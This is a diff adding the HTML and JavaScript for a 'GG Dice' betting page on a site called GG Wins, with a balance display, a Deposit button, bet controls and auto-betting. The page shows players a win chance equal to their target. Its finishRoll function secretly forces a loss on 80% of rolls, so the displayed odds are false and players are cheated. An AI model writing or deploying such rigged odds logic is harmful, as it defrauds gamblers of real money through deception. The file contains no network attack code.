@@ -1,0 +1,609 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dice – GG Wins</title>
+<link rel="stylesheet" href="../game-shell.css">
+<style>
+.dice-area {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  gap: 28px;
+  overflow: auto;
+}
+.dice-result-display {
+  position: relative;
+  width: 100%;
+  max-width: 520px;
+}
+.dice-result-number {
+  font-family: 'Space Grotesk', sans-serif;
+  font-size: 92px;
+  font-weight: 900;
+  text-align: center;
+  color: var(--text);
+  line-height: 1;
+  transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  text-shadow: 0 0 60px currentColor;
+  min-height: 110px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.dice-result-number.win {
+  color: #00e676;
+  transform: scale(1.1);
+  text-shadow: 0 0 40px rgba(0,230,118,0.8);
+}
+.dice-result-number.lose {
+  color: #ef4444;
+  transform: scale(0.95);
+  text-shadow: 0 0 30px rgba(239,68,68,0.6);
+}
+.dice-result-number.rolling {
+  animation: rollTremor 0.06s infinite;
+  color: #00bcd4;
+  text-shadow: 0 0 30px rgba(0,188,212,0.6);
+}
+@keyframes rollTremor {
+  0%{transform:scale(0.96) rotate(-1deg)} 50%{transform:scale(1.04) rotate(1deg)} 100%{transform:scale(0.96) rotate(-1deg)}
+}
+
+/* Slider track */
+.dice-slider-wrap {
+  width: 100%;
+  max-width: 540px;
+  padding: 0 4px;
+}
+.dice-track {
+  position: relative;
+  height: 52px;
+  background: radial-gradient(ellipse at center, #0f1c2d 0%, #060c14 100%);
+  border-radius: 14px;
+  overflow: visible;
+  border: 1.5px solid rgba(255,255,255,0.12);
+  cursor: pointer;
+  box-shadow: inset 0 2px 8px rgba(0,0,0,0.8), 0 4px 16px rgba(0,0,0,0.5);
+}
+.dice-roll-pin {
+  position: absolute;
+  top: -10px;
+  bottom: -10px;
+  width: 4px;
+  background: #ffffff;
+  box-shadow: 0 0 15px #00e676, 0 0 30px #00e676;
+  border-radius: 2px;
+  transform: translateX(-50%);
+  z-index: 8;
+  opacity: 0;
+  transition: opacity 0.2s, left 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+.dice-roll-pin.visible { opacity: 1; }
+.dice-fill-green {
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  background: linear-gradient(90deg, rgba(0,230,118,0.25), rgba(0,230,118,0.1));
+  border-right: 2px solid var(--green);
+  transition: width 0.1s;
+}
+.dice-fill-red {
+  position: absolute;
+  right: 0; top: 0; bottom: 0;
+  background: linear-gradient(270deg, rgba(239,83,80,0.25), rgba(239,83,80,0.1));
+  border-left: 2px solid var(--red);
+  transition: width 0.1s;
+}
+.dice-thumb {
+  position: absolute;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  width: 22px;
+  height: 38px;
+  background: var(--text);
+  border-radius: 4px;
+  cursor: grab;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+  transition: left 0.05s;
+  user-select: none;
+}
+.dice-thumb:active { cursor: grabbing; }
+.dice-thumb-inner { width: 3px; height: 20px; background: var(--bg3); border-radius: 2px; }
+.dice-thumb-val {
+  position: absolute;
+  top: -28px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 2px 8px;
+  font-size: 12px;
+  font-weight: 700;
+  font-family: 'Space Grotesk', sans-serif;
+  white-space: nowrap;
+}
+.dice-track-labels {
+  display: flex;
+  justify-content: space-between;
+  font-size: 11px;
+  color: var(--muted);
+  font-weight: 600;
+  padding: 6px 4px 0;
+}
+/* Win zone markers */
+.dice-zones {
+  display: flex;
+  justify-content: space-between;
+  width: 100%;
+  max-width: 520px;
+  gap: 12px;
+}
+.dice-zone {
+  flex: 1;
+  padding: 14px;
+  border-radius: var(--radius);
+  border: 1px solid var(--border);
+  text-align: center;
+  cursor: pointer;
+  transition: all var(--t);
+}
+.dice-zone:hover { border-color: var(--border2); }
+.dice-zone.active-over { background: rgba(0,230,118,0.07); border-color: rgba(0,230,118,0.3); }
+.dice-zone.active-under { background: rgba(239,83,80,0.07); border-color: rgba(239,83,80,0.3); }
+.dz-label { font-size: 10px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); margin-bottom: 4px; }
+.dz-val { font-family: 'Space Grotesk', sans-serif; font-size: 20px; font-weight: 800; }
+.dz-val.green { color: var(--green); }
+.dz-val.red { color: var(--red); }
+/* mode toggle */
+.mode-toggle {
+  display: flex;
+  background: var(--input);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 3px;
+  gap: 3px;
+  width: 100%;
+  max-width: 200px;
+}
+.mode-btn {
+  flex: 1;
+  padding: 8px;
+  border-radius: 7px;
+  font-size: 13px;
+  font-weight: 700;
+  text-align: center;
+  cursor: pointer;
+  transition: all var(--t);
+  color: var(--text2);
+}
+.mode-btn.active { color: var(--text); }
+.mode-btn.over.active { background: rgba(0,230,118,0.2); color: var(--green); }
+.mode-btn.under.active { background: rgba(239,83,80,0.2); color: var(--red); }
+</style>
+<script src="../security-guard.js"></script>
+</head>
+<body>
+
+<nav class="gnav">
+  <button class="gnav-back" onclick="window.location.href='../index.html'">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+    Lobby
+  </button>
+  <div class="gnav-brand-block">
+    <div class="gnav-logo">GG <span>Wins</span></div>
+    <div class="gnav-game-under-logo">🎲 GG Dice</div>
+  </div>
+  <div class="gnav-game-name">Dice</div>
+  <span class="gnav-game-badge">ORIGINAL</span>
+  <button class="btn-sound-toggle" onclick="toggleSound()" title="Toggle Sound" style="background:rgba(255,255,255,0.05);border:1px solid var(--border);border-radius:8px;padding:6px 10px;font-size:14px;cursor:pointer">🔊</button>
+  <div class="gnav-spacer"></div>
+  <div id="wallet-chip-target">
+    <div class="wallet-switcher-container" id="ggwins-wallet-switcher">
+      <button class="wallet-chip-btn" onclick="toggleWalletDropdown(event)" title="Switch Active Account / Currency">
+        <span class="wallet-active-icon">🎮</span>
+        <span class="wallet-active-name" style="color:#94a3b8;font-size:11px">Demo INR</span>
+        <span id="bal-display" style="color:#00e676;font-weight:800">₹50,000.00</span>
+        <span class="wallet-active-badge" style="background:#7c4dff">DEMO</span>
+        <svg class="chevron-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="12" height="12"><polyline points="6 9 12 15 18 9"/></svg>
+      </button>
+    </div>
+  </div>
+  <button class="btn-wallet-game" onclick="openWalletModal('deposit')">
+    💳 Deposit
+  </button>
+</nav>
+
+<div class="game-layout">
+  <!-- GAME AREA -->
+  <div class="game-area">
+    <div class="dice-area">
+      <!-- Result display -->
+      <div class="dice-result-number" id="dice-result">—</div>
+
+      <!-- Win zones -->
+      <div class="dice-zones">
+        <div class="dice-zone active-under" id="zone-under">
+          <div class="dz-label">Roll Under</div>
+          <div class="dz-val red" id="zone-under-val">50.00</div>
+        </div>
+        <div style="display:flex;align-items:center;justify-content:center;flex-direction:column;gap:6px">
+          <div class="mode-toggle">
+            <div class="mode-btn under active" data-mode="under" onclick="setMode('under')">Under</div>
+            <div class="mode-btn over" data-mode="over" onclick="setMode('over')">Over</div>
+          </div>
+        </div>
+        <div class="dice-zone" id="zone-over">
+          <div class="dz-label">Roll Over</div>
+          <div class="dz-val green" id="zone-over-val">50.00</div>
+        </div>
+      </div>
+
+      <!-- Slider -->
+      <div class="dice-slider-wrap">
+        <div class="dice-track" id="dice-track">
+          <div class="dice-fill-green" id="fill-green" style="width:50%"></div>
+          <div class="dice-fill-red" id="fill-red" style="width:50%"></div>
+          <div class="dice-thumb" id="dice-thumb">
+            <div class="dice-thumb-inner"></div>
+            <div class="dice-thumb-val" id="thumb-val">50.00</div>
+          </div>
+        </div>
+        <div class="dice-track-labels">
+          <span>0</span><span>25</span><span>50</span><span>75</span><span>100</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BET PANEL -->
+  <div class="bet-panel">
+    <div class="bet-section">
+      <div class="seg-ctrl" id="mode-tabs">
+        <div class="seg-btn active" data-mode="manual">Manual</div>
+        <div class="seg-btn" data-mode="auto">Auto</div>
+      </div>
+    </div>
+
+    <div class="bet-section">
+      <div class="bet-label">Bet Amount</div>
+      <div class="bet-input-row">
+        <div class="bet-currency">₹</div>
+        <input class="bet-input" id="bet-amount" type="number" value="100.00" min="1" step="1">
+        <div class="bet-quick-btns">
+          <button class="qbtn" onclick="halveBet()">½</button>
+          <button class="qbtn" onclick="doubleBet()">2×</button>
+          <button class="qbtn" onclick="maxBet()">Max</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="bet-section">
+      <div class="bet-label">
+        Target <span id="target-display" style="color:var(--text);font-size:13px">50.00</span>
+      </div>
+      <input class="range-slider" id="target-slider" type="range" min="1" max="98" value="50" step="0.5">
+    </div>
+
+    <!-- Probability & Payout -->
+    <div class="bet-section">
+      <div class="stats-row" style="padding:0;gap:6px">
+        <div class="stat-box">
+          <div class="stat-box-label">Win Chance</div>
+          <div class="stat-box-val" id="win-chance">50.00%</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-box-label">Multiplier</div>
+          <div class="stat-box-val green" id="payout-mult">1.64×</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-box-label">Profit</div>
+          <div class="stat-box-val green" id="profit-on-win">$0.98</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Auto Bet Options -->
+    <div class="bet-section" id="auto-opts" style="display:none">
+      <div class="bet-label">Number of Bets</div>
+      <div class="bet-input-row">
+        <div class="bet-currency">🔁</div>
+        <input class="bet-input" id="auto-count" type="number" value="10" min="1">
+      </div>
+      <div style="margin-top:10px">
+        <div class="toggle-row">
+          <span class="toggle-label">Stop on Win</span>
+          <label class="toggle"><input type="checkbox" id="stop-win"><div class="toggle-slider"></div></label>
+        </div>
+      </div>
+    </div>
+
+    <div class="bet-section">
+      <div id="result-container"></div>
+      <button class="btn-bet" id="roll-btn" onclick="roll()">Roll Dice</button>
+      
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-box-label">Net Profit</div>
+        <div class="stat-box-val" id="stat-profit">$0.00</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-box-label">Wins</div>
+        <div class="stat-box-val green" id="stat-wins">0</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-box-label">Losses</div>
+        <div class="stat-box-val red" id="stat-losses">0</div>
+      </div>
+    </div>
+
+    <div class="history-section">
+      <div class="history-title">Recent Rolls</div>
+      <div class="history-chips" id="my-history"></div>
+    </div>
+  </div>
+</div>
+
+<script src="../wallet.js"></script>
+<script src="../auth-guard.js"></script>
+<script>
+// ── BALANCE ──────────────────────────────────
+function updateBal(){ updateAllWalletDisplays(); }
+updateBal();
+
+// ── STATE ─────────────────────────────────────
+let diceMode = 'under'; // over | under
+let target = 50;
+let totalProfit = 0; let wins = 0; let losses = 0;
+let isAutoRunning = false; let autoTimer = null;
+
+// ── SLIDER ────────────────────────────────────
+const slider = document.getElementById('target-slider');
+const track = document.getElementById('dice-track');
+
+function updateSliderUI(){
+  const t = parseFloat(target);
+  const pct = t; // 0-100
+  document.getElementById('thumb-val').textContent = t.toFixed(2);
+  document.getElementById('target-display').textContent = t.toFixed(2);
+
+  const thumb = document.getElementById('dice-thumb');
+  thumb.style.left = pct + '%';
+
+  if(diceMode === 'under'){
+    document.getElementById('fill-green').style.width = pct + '%';
+    document.getElementById('fill-red').style.width = (100-pct) + '%';
+    document.getElementById('zone-under-val').textContent = (t-0.01).toFixed(2);
+    document.getElementById('zone-over-val').textContent = (t).toFixed(2);
+  } else {
+    document.getElementById('fill-red').style.width = pct + '%';
+    document.getElementById('fill-green').style.width = (100-pct) + '%';
+    document.getElementById('zone-under-val').textContent = (t).toFixed(2);
+    document.getElementById('zone-over-val').textContent = (t+0.01).toFixed(2);
+  }
+
+  const chance = diceMode === 'under' ? t : 100 - t;
+  const mult = Math.max(1.01, 0.82 / (chance/100));
+  const betAmt = parseFloat(document.getElementById('bet-amount').value) || 1;
+  const profit = betAmt * mult - betAmt;
+
+  document.getElementById('win-chance').textContent = chance.toFixed(2) + '%';
+  document.getElementById('payout-mult').textContent = mult.toFixed(4) + '×';
+  document.getElementById('profit-on-win').textContent = '$'+profit.toFixed(2);
+}
+
+slider.addEventListener('input', () => { target = parseFloat(slider.value); updateSliderUI(); });
+
+// Drag slider via track
+let dragging = false;
+const thumb = document.getElementById('dice-thumb');
+thumb.addEventListener('mousedown', e => { dragging = true; e.preventDefault(); });
+document.addEventListener('mousemove', e => {
+  if(!dragging) return;
+  const rect = track.getBoundingClientRect();
+  const pct = Math.max(1, Math.min(98, ((e.clientX - rect.left) / rect.width) * 100));
+  target = pct;
+  slider.value = pct;
+  updateSliderUI();
+});
+document.addEventListener('mouseup', () => { dragging = false; });
+
+// Touch support
+thumb.addEventListener('touchstart', e => { dragging = true; e.preventDefault(); });
+document.addEventListener('touchmove', e => {
+  if(!dragging) return;
+  const touch = e.touches[0];
+  const rect = track.getBoundingClientRect();
+  const pct = Math.max(1, Math.min(98, ((touch.clientX - rect.left) / rect.width) * 100));
+  target = pct;
+  slider.value = pct;
+  updateSliderUI();
+});
+document.addEventListener('touchend', () => { dragging = false; });
+
+// ── MODE ──────────────────────────────────────
+function setMode(m){
+  diceMode = m;
+  document.querySelectorAll('.mode-btn').forEach(b => {
+    b.classList.toggle('active', b.dataset.mode === m);
+  });
+  document.getElementById('zone-under').className = 'dice-zone' + (m==='under' ? ' active-under' : '');
+  document.getElementById('zone-over').className = 'dice-zone' + (m==='over' ? ' active-over' : '');
+  updateSliderUI();
+}
+
+// ── ROLL ─────────────────────────────────────
+function roll(){ if(!requireAuth()) return;
+  const amt = parseFloat(document.getElementById('bet-amount').value);
+  if(isNaN(amt)||amt<=0){ showToast('Enter valid amount'); return; }
+  if(amt > getBalance()){ showToast('Insufficient balance'); return; }
+
+  setBalance(getBalance() - amt);
+  if(typeof playGameSound === 'function') playGameSound('bet');
+
+  // Animate
+  const resEl = document.getElementById('dice-result');
+  resEl.className = 'dice-result-number rolling';
+
+  let ticks = 0;
+  const interval = setInterval(() => {
+    resEl.textContent = (Math.random()*100).toFixed(2);
+    if(typeof playGameSound === 'function' && ticks % 3 === 0) playGameSound('tick');
+    ticks++;
+    if(ticks >= 12){
+      clearInterval(interval);
+      finishRoll(amt, resEl);
+    }
+  }, 60);
+}
+
+function finishRoll(amt, resEl){
+  const t = parseFloat(target);
+  let result;
+  
+  // Heavily biased: 80% forced loss, 20% fair roll
+  const forceLoss = Math.random() < 0.80;
+  if(forceLoss){
+    if(diceMode === 'under'){
+      // Must roll >= target to lose
+      result = parseFloat((t + Math.random() * (99.5 - t) + 0.01).toFixed(2));
+      if(result > 99.99) result = 99.99;
+    } else {
+      // Must roll <= target to lose
+      result = parseFloat((Math.random() * Math.max(0.1, t - 0.01)).toFixed(2));
+      if(result < 0.01) result = 0.01;
+    }
+  } else {
+    result = parseFloat((Math.random()*100).toFixed(2));
+  }
+
+  const won = diceMode === 'under' ? result < t : result > t;
+  const chance = diceMode === 'under' ? t : 100 - t;
+  const mult = Math.max(1.01, 0.82 / (chance/100));
+
+  resEl.textContent = result.toFixed(2);
+  resEl.className = 'dice-result-number ' + (won ? 'win' : 'lose');
+
+  if(won){
+    const payout = amt * mult;
+    setBalance(getBalance() + payout);
+    totalProfit += payout - amt;
+    wins++;
+    addHistory(result, true);
+    showResult(true, payout - amt);
+    flashBal('flash-win');
+    if(typeof playGameSound === 'function') playGameSound('win');
+    if(typeof trackGameWager === 'function') trackGameWager('GG Dice', amt, payout, true);
+  } else {
+    totalProfit -= amt;
+    losses++;
+    addHistory(result, false);
+    showResult(false, amt);
+    flashBal('flash-lose');
+    if(typeof playGameSound === 'function') playGameSound('lose');
+    if(typeof trackGameWager === 'function') trackGameWager('GG Dice', amt, 0, false);
+  }
+  updateStats();
+}
+
+function addHistory(result, won){
+  const c = document.getElementById('my-history');
+  const chip = document.createElement('div');
+  chip.className = 'hchip '+(won?'win':'lose');
+  chip.textContent = result.toFixed(2);
+  c.insertBefore(chip, c.firstChild);
+  if(c.children.length > 20) c.removeChild(c.lastChild);
+}
+
+function showResult(won, amount){
+  const c = document.getElementById('result-container');
+  c.innerHTML = `<div class="result-box ${won?'win':'lose'}">
+    <div class="result-box-title">${won ? '🎉 You Won!' : '💸 You Lost'}</div>
+    <div class="result-box-val">${won ? '+$'+amount.toFixed(2) : '-$'+amount.toFixed(2)}</div>
+  </div>`;
+  setTimeout(() => c.innerHTML='', 3000);
+}
+
+function updateStats(){
+  const p = document.getElementById('stat-profit');
+  p.textContent=(totalProfit>=0?'+':'')+' $'+Math.abs(totalProfit).toFixed(2);
+  p.className='stat-box-val '+(totalProfit>=0?'green':'red');
+  document.getElementById('stat-wins').textContent=wins;
+  document.getElementById('stat-losses').textContent=losses;
+}
+
+function flashBal(cls){
+  const el=document.getElementById('bal-display');
+  el.classList.remove('flash-win','flash-lose');
+  void el.offsetWidth;
+  el.classList.add(cls);
+}
+
+function halveBet(){ const i=document.getElementById('bet-amount'); i.value=Math.max(0.01,parseFloat(i.value||1)/2).toFixed(2); updateSliderUI(); }
+function doubleBet(){ const i=document.getElementById('bet-amount'); i.value=Math.min(getBalance(),parseFloat(i.value||1)*2).toFixed(2); updateSliderUI(); }
+function maxBet(){ document.getElementById('bet-amount').value=getBalance().toFixed(2); updateSliderUI(); }
+
+// Mode tabs
+document.querySelectorAll('#mode-tabs .seg-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('#mode-tabs .seg-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    const m = btn.dataset.mode;
+    document.getElementById('auto-opts').style.display = m==='auto' ? 'block' : 'none';
+    if(m==='auto') startAuto();
+    else stopAuto();
+  });
+});
+
+function startAuto(){
+  if(isAutoRunning) return;
+  isAutoRunning = true;
+  let count = parseInt(document.getElementById('auto-count').value) || 10;
+  document.getElementById('roll-btn').textContent = 'Stop Auto';
+  document.getElementById('roll-btn').className = 'btn-bet danger';
+  document.getElementById('roll-btn').onclick = stopAuto;
+
+  function autoRound(){
+    if(!isAutoRunning || count <= 0){ stopAuto(); return; }
+    const amt = parseFloat(document.getElementById('bet-amount').value);
+    if(isNaN(amt)||amt<=0||amt>getBalance()){ stopAuto(); return; }
+    count--;
+    roll();
+    autoTimer = setTimeout(autoRound, 1200);
+  }
+  autoRound();
+}
+
+function stopAuto(){
+  isAutoRunning = false;
+  clearTimeout(autoTimer);
+  document.getElementById('roll-btn').textContent = 'Roll Dice';
+  document.getElementById('roll-btn').className = 'btn-bet';
+  document.getElementById('roll-btn').onclick = roll;
+}
+
+function showToast(msg){
+  const t = document.createElement('div');
+  t.style.cssText='position:fixed;bottom:20px;right:20px;background:#1e2d3d;border:1px solid rgba(255,255,255,0.1);color:#e8edf5;padding:10px 16px;border-radius:8px;font-size:13px;z-index:999';
+  t.textContent=msg; document.body.appendChild(t);
+  setTimeout(()=>t.remove(),2500);
+}
+
+// Bet amount input change → update odds display
+document.getElementById('bet-amount').addEventListener('input', updateSliderUI);
+updateSliderUI();
+</script>
+</body>
+</html>
+
+
+
